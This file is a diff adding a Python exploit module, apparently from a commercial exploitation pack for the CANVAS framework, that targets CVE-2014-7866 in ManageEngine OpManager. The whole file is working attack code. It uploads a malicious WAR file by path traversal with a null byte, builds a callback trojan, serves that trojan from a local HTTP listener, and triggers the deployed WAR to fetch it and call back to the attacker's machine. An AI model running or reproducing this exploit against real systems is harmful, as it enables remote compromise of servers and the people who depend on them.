@@ -1,0 +1,272 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2014
+#
+
+import sys
+import random
+import time
+import thread
+import urllib, urllib2
+import xml.sax.saxutils as saxutils
+
+if "." not in sys.path: 
+	sys.path.append(".")
+
+import libs.spkproxy as spkproxy
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from libs.canvasos import *
+
+import struct
+import canvasengine
+
+# GUI info
+NAME = "ManageEngine OpManager Remote Code Execution Vulnerability"
+
+DESCRIPTION = "Remote code execution vulnerability in ManageEngine OpManager"
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "ManageEngine"
+DOCUMENTATION["Date public"] = "2014.09.27"
+DOCUMENTATION["VersionsAffected"] = "ManageEngine OpManager < 11.3"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["References"] = "https://raw.githubusercontent.com/pedrib/PoC/master/ManageEngine/me_opmanager_socialit_it360.txt"
+DOCUMENTATION["CVE Name"] = "CVE-2014-7866"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7866"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = "0.1"
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit(tcpexploit):
+    def __init__(self):
+    	tcpexploit.__init__(self)
+    	self.TROJANMODE = 0
+    	self.setInfo(DESCRIPTION)
+    	self.name = NAME       
+    	self.protocol = "http"
+    	self.port = 8060
+    	self.sslport = 8060
+    	self.https = 0
+    	self.version = 0
+    	self.cmd = ""
+    	self.trojanname = "app.exe"
+    	self.filename = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_opmanager/d2.war"
+    	return
+
+ 
+    def maketrojan(self):   
+    	t_os = canvasos("Windows")
+    	t_os.arch = "X86"        
+    	self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os = t_os)        
+    	self.log("Writing out %d bytes to %s"%(len(self.mosdeftrojan), self.trojanname))            	
+    	file(self.trojanname, "wb").write(self.mosdeftrojan)
+    	self.setInfo("%s - done"%(NAME))
+    	ret = len(self.mosdeftrojan) != 0
+
+
+    def makesploit(self, clientheader, clientbody):            	
+    	h = spkproxy.header('SERVER')
+    	b = spkproxy.body()
+        
+    	self.maketrojan()
+                
+    	if clientheader.URL.count(self.trojanname):
+    		self.log("Sending MOSDEF trojan")
+    		f = open(self.trojanname, "rb")
+    		sploitstring = f.read()
+    		f.close()
+    		os.remove(self.trojanname)
+    		self.log("Sending %d bytes"%len(sploitstring))
+    		h.addHeader("Content-type","binary/octet-stream")
+    		h.addHeader("Connection","close")
+    		b.setBody(sploitstring)
+
+    	return h, b
+
+
+    def neededListenerTypes(self):
+    	from canvasengine import WIN32MOSDEF
+    	return [WIN32MOSDEF]
+
+
+    #################################################################################################################
+    # Code from httpserver.py
+    def listen(self):
+        self.getargs()
+        s=self.gettcplistener(80, "0.0.0.0")
+
+        if not s:
+            self.log("Cannot listen on port 80 - perhaps that port is already bound?")
+            return 0
+        s.set_timeout(5)
+        self.s=s
+        return s 
+
+    def accept(self, s=None ):
+        """
+        Try to accept one connection
+        returns true if we found one
+        """
+        #we loop on this ,so no annoying printouts here
+        #self.log("Accepting connection")
+        if s==None:
+            s=self.s 
+        try:
+            infd,addr=s.accept()
+        except timeoutsocket.Timeout:
+            #self.log("Timed out - no accept yet")
+            return 
+        if infd==-1:
+            return
+
+        #else we have an infd
+        self.handle(infd)
+        return True #handled connection
+        
+    def handle(self, infd): 
+        self.log("Handling connection")
+        clientheader = spkproxy.header(state = "SERVER")
+        clientheader.ssl = self.ssl
+        ret = clientheader.readdata(infd)
+        clientbody = spkproxy.body()
+        
+        if clientheader.gotGoodHeader():
+            if clientheader.bodySize()>0 or clientheader.wasChunked:
+                self.log("Reading body")
+                clientbody.read(infd, clientheader.bodySize(), clientheader.wasChunked, 0)
+                self.log("Read body")
+
+        self.log("Creating exploit response")
+
+        servheader,servbody = self.makesploit(clientheader,clientbody)
+        
+        self.log("Responding")
+        
+        bodydata="".join(servbody.data)
+                    
+        #now we respond...
+        response = ""
+        response += "%s %s %s\r\n"%(servheader.version, servheader.status, servheader.msg)
+	
+	self.log(response)
+
+        for akey in servheader.headerValuesDict.keys():
+            if akey not in [ "Content-Length", "Content-length"]:
+                response += servheader.grabHeader(akey)
+        self.log("Sending header data of %d bytes"%len(response))
+        chunked=0 #for now, eventually we'll send random chunks down the pipe.\..
+        if not chunked:
+            response+="Content-Length: "+str(len(bodydata))+"\r\n"
+        response+="\r\n"
+        response+="".join(bodydata)
+        self.log("Total response length is %d bytes"%len(response))
+        try:
+            infd.sendall(response)
+        except socket.error:
+            self.log("Connection closed by peer")
+        self.log("Response sent")
+        infd.close() #connection close - later on we'll keep it.
+        return 
+    #
+    #################################################################################################################
+        
+        
+    def startHTTPServer(self):
+    	s = self.listen()
+        
+    	if not s:
+    		self.log("Failed to listen - not running")
+    		return 0
+    		
+    	while 1:
+    		if self.state==self.HALT:
+    			self.s.close()
+    			break
+    			
+    		self.accept()
+
+    	self.setInfo("%s on %s:%d - done (success!)"%(NAME, self.bindip, self.port))
+        
+    	return 1    	
+    
+
+    def getargs(self):	
+    	self.host = self.target.interface
+    	self.port = int(self.argsDict.get("port", self.port))
+    	self.sslport = int(self.argsDict.get("sslport", self.sslport))
+    	self.https = int(self.argsDict.get("https", self.https))     
+  
+    def run(self):
+    	# Check arguments
+    	self.getargs()
+
+    	# Start HTTP server
+    	thread.start_new_thread(self.startHTTPServer,())    		
+
+    	# Open WAR file
+    	f = open(self.filename, "rb")
+    	fdata = f.read()
+    	f.close()
+            
+    	# Upload WAR file                         
+    	url = "/servlet/MigrateLEEData?fileName=../tomcat/webapps/d2.war%00"
+    
+    	if self.https == 0:
+    	   self.protocol = "http"
+    	else:
+    	   self.protocol = "https"
+    	   self.port = self.sslport
+    
+    	mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)
+    	handle = spkproxy.urlopen(mainurl, exploit=self, data=fdata, extraheaders=[("User-Agent","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"), ("Content-Type", "application/octet-stream")], verb="POST")
+    	data = handle.read()  
+
+    	time.sleep(5)
+        	
+    	# Execute uploaded WAR file
+    	url = "/d2/d2?url=http://%s:80"%(self.callback.ip)
+    	mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)
+    	handle = spkproxy.urlopen(mainurl, exploit=self, extraheaders=[("User-Agent","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)")])
+    	data = handle.read()  
+        
+    	return 1
+    	
+        		
+    def usage(self):        
+    	print "Usage: %s -t targethost -l localip -d localport\n" % sys.argv[0]
+
+    	i = 0
+
+    	print 'Available versions:'
+
+    	for listline in targets.values():
+    		print '\t%d: %s'%(i, listline)
+    		i = i + 1
+
+    	sys.exit(0) 
+
+
+if __name__ == '__main__':
+	print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+	app = theexploit()
+	ret = standard_callback_commandline(app)
